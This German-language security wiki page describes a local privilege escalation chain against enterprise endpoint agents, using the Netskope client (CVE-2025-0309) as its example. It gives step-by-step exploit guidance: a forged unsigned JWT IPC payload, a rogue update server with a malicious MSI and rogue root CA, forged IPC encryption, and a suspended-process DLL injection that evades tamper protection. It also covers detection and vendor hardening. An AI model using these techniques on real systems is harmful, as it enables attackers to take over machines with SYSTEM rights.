# Missbrauch von Enterprise Auto‑Updaters und privilegierter IPC (z. B. Netskope stAgentSvc)

{{#include ../../banners/hacktricks-training.md}}

Diese Seite verallgemeinert eine Klasse von Windows Local Privilege Escalation‑Ketten, die in Enterprise‑Endpoint‑Agenten und Updatern vorkommen und eine niedrigschwellige IPC‑Schnittstelle sowie einen privilegierten Update‑Flow bereitstellen. Ein repräsentatives Beispiel ist Netskope Client für Windows < R129 (CVE-2025-0309), bei dem ein niedrig privilegierter Benutzer eine Enrollment auf einen Angreifer‑kontrollierten Server erzwingen und anschließend ein bösartiges MSI liefern kann, das vom SYSTEM‑Dienst installiert wird.

Kernideen, die sich gegen ähnliche Produkte wiederverwenden lassen:
- Missbrauche die localhost‑IPC eines privilegierten Dienstes, um eine erneute Enrollment oder Neukonfiguration auf einen Angreifer‑Server zu erzwingen.
- Implementiere die Update‑Endpoints des Vendors, liefere ein rogue Trusted Root CA und weise den Updater auf ein bösartiges, „signed“ Paket.
- Umgehe schwache Signer‑Checks (CN allow‑lists), optionale Digest‑Flags und lax konfigurierte MSI‑Eigenschaften.
- Wenn IPC „encrypted“ ist, leite Key/IV aus weltweit lesbaren Maschinen‑Identifikatoren ab, die in der Registry gespeichert sind.
- Wenn der Dienst Anrufer nach Image‑Pfad/Prozessname einschränkt, injiziere in einen allow‑listed Prozess oder spawn einen Prozess suspended und bootstrappe deine DLL via eines minimalen thread‑context patches.

---
## 1) Erzwingen der Enrollment zu einem Angreifer‑Server über localhost‑IPC

Viele Agenten liefern einen User‑Mode UI‑Prozess, der über localhost TCP mittels JSON mit einem SYSTEM‑Dienst kommuniziert.

Beobachtet in Netskope:
- UI: stAgentUI (niedrige Integrität) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Exploit‑Ablauf:
1) Erzeuge ein JWT Enrollment‑Token, dessen Claims den Backend‑Host steuern (z. B. AddonUrl). Verwende alg=None, sodass keine Signatur erforderlich ist.
2) Sende die IPC‑Nachricht, die den Provisioning‑Befehl mit deinem JWT und dem Tenant‑Namen auslöst:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) Der Dienst beginnt, deinen rogue server wegen enrollment/config anzusprechen, z. B.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Hinweise:
- Wenn die Caller‑Verifizierung pfad-/namenbasiert ist, lasse die Anfrage von einem auf der Allow‑List stehenden Vendor‑Binary ausgehen (siehe §4).

---
## 2) Hijacking the update channel to run code as SYSTEM

Sobald der Client mit deinem Server kommuniziert, implementiere die erwarteten Endpunkte und leite ihn zu einem attacker MSI. Typische Abfolge:

1) /v2/config/org/clientconfig → Gib eine JSON‑Konfiguration zurück mit einem sehr kurzen Updater‑Intervall, z. B.:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Return a PEM CA certificate. Der Dienst installiert es in den Local Machine Trusted Root store.
3) /v2/checkupdate → Supply metadata pointing to a malicious MSI and a fake version.

Bypassing common checks seen in the wild:
- Signer CN allow‑list: der Dienst prüft möglicherweise nur, ob das Subject CN gleich “netSkope Inc” oder “Netskope, Inc.” ist. Deine rogue CA kann ein Leaf mit diesem CN ausstellen und das MSI signieren.
- CERT_DIGEST property: füge eine harmlose MSI‑Eigenschaft mit dem Namen CERT_DIGEST ein. Wird bei der Installation nicht durchgesetzt.
- Optional digest enforcement: ein Config‑Flag (z. B. check_msi_digest=false) deaktiviert zusätzliche kryptografische Validierung.

Result: Der SYSTEM‑Dienst installiert dein MSI von
C:\ProgramData\Netskope\stAgent\data\*.msi
und führt beliebigen Code als NT AUTHORITY\SYSTEM aus.

---
## 3) Forging encrypted IPC requests (when present)

Ab R127 verpackte Netskope IPC‑JSON in ein encryptData‑Feld, das wie Base64 aussieht. Reverse‑Engineering zeigte AES mit Key/IV, die aus registry‑Werten abgeleitet werden, die von jedem Benutzer lesbar sind:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Angreifer können die Verschlüsselung reproduzieren und gültige verschlüsselte Befehle von einem Standard‑Benutzer senden. Genereller Tipp: wenn ein Agent plötzlich seine IPC „verschlüsselt“, suche nach device IDs, product GUIDs, install IDs unter HKLM als Material.

---
## 4) Bypassing IPC caller allow‑lists (path/name checks)

Einige Dienste versuchen, den Peer zu authentifizieren, indem sie die PID der TCP‑Verbindung auflösen und den Image‑Pfad/-Namen mit allow‑gelisteten Vendor‑Binaries unter Program Files vergleichen (z. B. stagentui.exe, bwansvc.exe, epdlp.exe).

Zwei praktische Umgehungen:
- DLL‑Injection in einen allow‑gelisteten Prozess (z. B. nsdiag.exe) und Proxying der IPC von innen heraus.
- Einen allow‑gelisteten Binary suspended starten und dein Proxy‑DLL bootstrappen ohne CreateRemoteThread (siehe §5), um driver‑durchgesetzte Tamper‑Regeln zu erfüllen.

---
## 5) Tamper‑protection friendly injection: suspended process + NtContinue patch

Produkte liefern oft einen minifilter/OB callbacks Driver (z. B. Stadrv), der gefährliche Rechte von Handles zu geschützten Prozessen entfernt:
- Process: entfernt PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: beschränkt auf THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Ein zuverlässiger User‑Mode Loader, der diese Einschränkungen respektiert:
1) CreateProcess eines Vendor‑Binaries mit CREATE_SUSPENDED.
2) Handle erhalten, die noch erlaubt sind: PROCESS_VM_WRITE | PROCESS_VM_OPERATION am Prozess und ein Thread‑Handle mit THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (oder nur THREAD_RESUME, wenn du Code bei einem bekannten RIP patchst).
3) ntdll!NtContinue (oder eine andere frühe, garantiert gemappte Thunk) mit einem winzigen Stub überschreiben, der LoadLibraryW auf deinem DLL‑Pfad aufruft und dann zurückspringt.
4) ResumeThread, um deinen Stub im Prozess auszulösen und deine DLL zu laden.

Weil du PROCESS_CREATE_THREAD oder PROCESS_SUSPEND_RESUME bei einem bereits geschützten Prozess nie benutzt hast (du hast den Prozess selbst erstellt), ist die Policy des Drivers erfüllt.

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) automatisiert eine rogue CA, malicious MSI signing und stellt die benötigten Endpunkte bereit: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope ist ein custom IPC‑Client, der beliebige (optional AES‑verschlüsselte) IPC‑Nachrichten erstellt und die suspended‑process Injection beinhaltet, damit sie von einem allow‑gelisteten Binary ausgeht.

---
## 7) Detection opportunities (blue team)
- Überwache Hinzufügungen zum Local Machine Trusted Root. Sysmon + registry‑mod Eventing (siehe SpecterOps Guidance) funktioniert gut.
- Markiere MSI‑Ausführungen, die vom Agent‑Service aus Pfaden wie C:\ProgramData\<vendor>\<agent>\data\*.msi initiiert werden.
- Prüfe Agent‑Logs auf unerwartete Enrollment Hosts/Tenants, z. B.: C:\ProgramData\netskope\stagent\logs\nsdebuglog.log – suche nach addonUrl / tenant‑Anomalien und provisioning msg 148.
- Alarmiere bei localhost IPC‑Clients, die nicht die erwarteten signed Binaries sind oder aus ungewöhnlichen Child‑Process‑Trees stammen.

---
## Hardening tips for vendors
- Binde Enrollment/Update‑Hosts an eine strikte Allow‑List; lehne untrusted Domains in clientcode ab.
- Authentifiziere IPC‑Peers mit OS‑Primitiven (ALPC security, named‑pipe SIDs) statt mit Image‑Pfad/-Namen‑Checks.
- Halte secret Material aus world‑readable HKLM; falls IPC verschlüsselt werden muss, leite Keys aus geschützten Secrets ab oder verhandle über authentifizierte Kanäle.
- Behandle den Updater als Supply‑Chain‑Angriffsfläche: erfordere eine vollständige Kette zu einer trusted CA, die du kontrollierst, verifiziere Paket‑Signaturen gegen gepinnte Keys und fail closed, wenn Validierung in der Config deaktiviert ist.

## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)

{{#include ../../banners/hacktricks-training.md}}
